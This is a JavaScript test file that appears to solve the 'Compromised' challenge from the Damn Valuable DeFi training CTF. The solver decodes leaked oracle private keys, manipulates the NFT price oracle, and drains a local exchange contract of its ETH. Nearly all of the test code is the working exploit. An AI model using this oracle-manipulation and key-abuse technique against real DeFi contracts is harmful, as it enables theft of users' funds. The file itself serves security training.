const {expect} = require('chai');
const {ethers} = require('hardhat');
describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    let deployer, attacker;
    const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
    const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const ExchangeFactory = await ethers.getContractFactory('Exchange', deployer);
        const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
        const TrustfulOracleFactory = await ethers.getContractFactory('TrustfulOracle', deployer);
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);

        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            await ethers.provider.send("hardhat_setBalance", [
                sources[i],
                "0x1bc16d674ec80000", // 2 ETH
            ]);
            expect(
                await ethers.provider.getBalance(sources[i])
            ).to.equal(ethers.utils.parseEther('2'));
        }

        // Attacker starts with 0.1 ETH in balance
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracleFactory.attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await ExchangeFactory.deploy(
            this.oracle.address,
            {value: EXCHANGE_INITIAL_ETH_BALANCE}
        );
        this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
    });

    const decode = (value) => {
        return Buffer.from(
            Buffer.from(
                value.replace(/ /g, ''),
                'hex').toString(),
            'base64'
        ).toString();
    }
    const compromisedOracles = [
        '4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35',
        '4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34'
    ].map((privateKeyHex) =>
        decode(privateKeyHex)
    ).map((oraclePrivateKey) =>
        new ethers.Wallet(oraclePrivateKey, ethers.provider)
    );
    const tokenSymbol = "DVNFT";

    it.skip('Exploit - v1.0 - cmichel.io', async function () {
        /** CODE YOUR EXPLOIT HERE */
        console.log('Compromised Oracles: ', compromisedOracles.map(wallet => wallet.address));

        const changePrice = async (newPrice) => {
            const funcData = this.oracle.interface.encodeFunctionData(
                "postPrice(string,uint256)",
                ["DVNFT", newPrice]
            );
            const signedTxns = await Promise.all(
                compromisedOracles.map(account => {
                    return account.signTransaction({
                        to: this.oracle.address,
                        gasPrice: 714466800,
                        gasLimit: 30000000,
                        data: funcData,
                    });
                })
            );
            console.log(signedTxns);
            return Promise.all(
                signedTxns.map(signedTxn =>
                    ethers.provider.sendTransaction(signedTxn)
                )
            );
        }

        /*
         * When this is 0.1 ETH, it does not work and fails with:
         *
         *   `InvalidInputError: sender doesn't have enough funds to send tx. The max upfront cost is: 100292757721972462 and the sender's account only has: 100000000000000000`
         *
         * This is because the value being sent it the total amount in the attacker wallet. Reducing it to 0.09 would do the trick.
         */
        const reducedPrice = ethers.utils.parseEther(`0.09`);
        await changePrice(reducedPrice.toString());
        console.log(`Price changed to ${reducedPrice} == ${await this.oracle.getMedianPrice("DVNFT")}`);

        const cost = 116420538130000000;
        const balance = (await ethers.provider.getBalance(await attacker.address));
        const gasPrice = balance.div(2).sub(30000000);
        console.log(`Balance: ${balance}, gasPrice: `, gasPrice);

        await this.exchange.connect(attacker).buyOne({
            value: reducedPrice,
            from: (await attacker.address)
        });
        // I got flustered at this point and did not continue with the method to exploit
        // the contract. I found another method, which I actually like better since it uses
        // `ethers` and the contract. However, it is likely good to know how to do this via the
        // `rawTransaction` method if I want to learn as much as I can about this stuff.
    });

    it('Exploit - v2.0', async function () {
        /** CODE YOUR EXPLOIT HERE */
            // https://zuhaibmd.medium.com/damn-vulnerable-defi-challenge-7-compromised-feb249be0e2f
        let attackerBalance = (await ethers.provider.getBalance(attacker.address)).toString();
        console.log({attackerBalance, compromisedOracles: compromisedOracles.map(wallet => wallet.address)});

        let medianPrice = (await this.oracle.getMedianPrice(tokenSymbol)).toString();
        console.log("Initial price: ", {medianPrice});

        const postPriceTxn1 = await this.oracle.connect(compromisedOracles[0]).postPrice(tokenSymbol, 0);
        const postPriceTxn2 = await this.oracle.connect(compromisedOracles[1]).postPrice(tokenSymbol, 0);
        medianPrice = (await this.oracle.getMedianPrice(tokenSymbol)).toString();
        console.log("Price Before Buy: ", {medianPrice});

        try {
            const buyTxn = await (await this.exchange.connect(attacker)).buyOne({
                value: ethers.utils.parseEther(`0.09`),
            });
            buyTxn.wait();
        } catch (e) {
            console.error(`Could not buyOne() for ${await attacker.address}: `, e);
        }
        medianPrice = (await this.oracle.getMedianPrice(tokenSymbol)).toString();
        console.log("Price After Buy: ", {medianPrice});

        const sellPrice = (await ethers.provider.getBalance(this.exchange.address)).toString();
        console.log({sellPrice})

        const postPriceTxn3 = await this.oracle.connect(compromisedOracles[0]).postPrice(tokenSymbol, sellPrice);
        const postPriceTxn4 = await this.oracle.connect(compromisedOracles[1]).postPrice(tokenSymbol, sellPrice);
        medianPrice = (await this.oracle.getMedianPrice(tokenSymbol)).toString();
        console.log("Price Before Sell: ", {medianPrice});

        const apprTxn = await this.nftToken.connect(attacker).approve(await this.exchange.address, 0);
        try {
            const sellTxn = await (await this.exchange.connect(attacker)).sellOne(0);
            sellTxn.wait();
        } catch (e) {
            console.error(`Could not sellOne() for ${await attacker.address}: `, e);
        }

        const postPriceTxn5 = await this.oracle.connect(compromisedOracles[0]).postPrice(tokenSymbol, INITIAL_NFT_PRICE);
        const postPriceTxn6 = await this.oracle.connect(compromisedOracles[1]).postPrice(tokenSymbol, INITIAL_NFT_PRICE);
        medianPrice = (await this.oracle.getMedianPrice(tokenSymbol)).toString();
        console.log("Price After Sell: ", {medianPrice});
        attackerBalance = (await ethers.provider.getBalance(attacker.address)).toString();
        console.log({attackerBalance});
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(this.exchange.address)
        ).to.be.eq('0');

        // Attacker's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);

        // Attacker must not own any NFT
        expect(
            await this.nftToken.balanceOf(attacker.address)
        ).to.be.eq('0');

        // NFT price shouldn't have changed
        expect(
            await this.oracle.getMedianPrice("DVNFT")
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
